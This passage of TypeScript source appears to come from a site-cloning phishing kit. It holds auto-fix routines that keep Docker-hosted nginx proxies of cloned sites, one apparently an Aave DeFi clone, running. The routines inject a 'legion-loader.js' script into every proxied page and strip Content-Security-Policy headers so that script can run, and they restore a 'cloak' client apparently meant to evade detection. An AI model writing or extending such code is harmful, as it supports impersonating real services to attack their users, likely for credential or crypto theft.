      if (issueId.includes('container_stopped')) {
        return this.fixStoppedContainer(issueId);
      }

      if (issueId.includes('duplicate_port')) {
        return this.fixDuplicatePort();
      }

      if (issueId.includes('no_script_injection')) {
        return this.fixScriptInjection(issue.cloneId!);
      }

      if (issueId.includes('missing_loader_injection')) {
        return this.fixLoaderInjection(issue.cloneId!);
      }

      if (issueId.includes('weak_csp_bypass')) {
        return this.fixCSPBypass(issue.cloneId!);
      }

      if (issueId.includes('incomplete_clone')) {
        return this.fixIncompleteClone(issue.cloneId!);
      }

      return false;
    } catch (e) {
      console.error('Auto-fix error:', e);
      return false;
    }
  }

  private fixCloakFilename(cloneId: string): boolean {
    const loaderPath = join(process.cwd(), '..', 'clones', cloneId, 'legion-loader.js');
    const content = readFileSync(loaderPath, 'utf-8');
    const fixed = content.replace(/legion-cloak-client-simplified/g, 'legion-cloak-client');
    writeFileSync(loaderPath, fixed);
    return true;
  }

  private fixStoppedContainer(issueId: string): boolean {
    const containerName = issueId.replace('container_stopped_', '');
    try {
      execSync(`docker start ${containerName}`);
      return true;
    } catch {
      return false;
    }
  }

  private fixDuplicatePort(): boolean {
    const db = getDb();
    const containers: any[] = db.prepare('SELECT * FROM containers WHERE status = ?').all('running');

    for (const container of containers) {
      const newPort = this.findFreePort();
      db.prepare('UPDATE containers SET port = ? WHERE id = ?').run(newPort, container.id);
    }
    return true;
  }

  private fixScriptInjection(cloneId: string): boolean {
    const configPath = join(process.cwd(), '..', 'clones', cloneId, 'nginx.conf');
    let content = readFileSync(configPath, 'utf-8');

    if (!content.includes('sub_filter')) {
      content = content.replace(
        'proxy_pass https://',
        'sub_filter "</head>" \'<script src="/legion-loader.js"></script></head>\';\nproxy_pass https://'
      );
      writeFileSync(configPath, content);
    }
    return true;
  }

  private fixLoaderInjection(cloneId: string): boolean {
    const configPath = join(process.cwd(), '..', 'clones', cloneId, 'nginx.conf');
    let content = readFileSync(configPath, 'utf-8');

    if (!content.includes('legion-loader.js')) {
      content = content.replace(
        '</head>',
        '<script src="/legion-loader.js"></script></head>'
      );
      writeFileSync(configPath, content);
    }
    return true;
  }

  private fixCSPBypass(cloneId: string): boolean {
    const configPath = join(process.cwd(), '..', 'clones', cloneId, 'nginx.conf');
    let content = readFileSync(configPath, 'utf-8');

    if (!content.includes('proxy_hide_header Content-Security-Policy')) {
      content = content.replace(
        'proxy_pass https://',
        'proxy_hide_header Content-Security-Policy;\nproxy_hide_header Content-Security-Policy-Report-Only;\nproxy_pass https://'
      );
      writeFileSync(configPath, content);
    }
    return true;
  }

  private fixIncompleteClone(cloneId: string): boolean {
    const clonePath = join(process.cwd(), '..', 'clones', cloneId);
    const configPath = join(clonePath, 'nginx.conf');

    if (!existsSync(configPath)) {
      try {
        const templatePath = join(process.cwd(), '..', 'clones', 'aave-clone', 'nginx.conf');
        const template = readFileSync(templatePath, 'utf-8');
        writeFileSync(configPath, template);
        return true;
      } catch {
        return false;
      }
    }
    return true;
  }

  private findFreePort(): number {
    let port = 8080;
    const db = getDb();

    while (port < 9000) {
      const exists: any = db.prepare('SELECT COUNT(*) as c FROM containers WHERE port = ?').get(port);
      if (!exists || exists.c === 0) return port;
      port++;
    }
    return 8080;
  }
}

export const healthChecker = new HealthChecker();
